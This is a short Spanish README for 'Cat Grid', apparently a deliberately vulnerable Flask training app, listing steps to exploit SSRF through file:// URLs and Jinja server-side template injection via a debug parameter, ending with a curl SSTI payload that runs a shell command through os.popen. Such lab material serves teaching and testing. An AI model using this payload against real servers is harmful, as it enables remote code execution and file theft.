# Cat Grid


Aplicación python con Flask vulnerable a SSRF y SSTI


Pasos : 
 - Ver que se accede a las imagenes a traves de localhost:5000
 - Leer archivos cambiando URL por file://
 - Descubrir parámetro debug que permite pasar parámetros
 - Con debug ver que es vulnerable a SSTI {{7*7}} en Jinja
 
 curl "http://172.31.24.25/?debug=\{\{self.__init__.__globals__.__builtins__.__import__('os').popen('pwd').read()\}\}"
 
 
